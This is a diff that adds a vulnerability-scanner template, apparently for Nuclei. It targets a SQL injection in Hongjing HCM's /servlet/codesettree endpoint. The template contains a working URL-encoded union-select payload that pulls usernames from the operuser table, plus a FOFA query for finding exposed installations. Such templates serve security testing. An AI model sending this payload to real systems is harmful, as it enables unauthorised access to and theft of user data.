@@ -1,0 +1,26 @@
+id: hongjing-HCM-codesettree-sqli
+
+info:
+  name: Hongjing HCM codesettree SQL injection vulnerability(�꾰 HCM codesettree SQL ע��©��)
+  author: linfeng7z
+  severity: critical
+  tags: hongjing,hcm,sqli
+  metadata:
+    fofa-query: body='< div class="hj-hy-all-one-logo"'
+
+requests:
+  - raw:
+      - |+
+        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1, 'root') || contains(body_1, 'icon') || contains(body_1, 'su')"
+          - "status_code_1 == 200"
+        condition: and
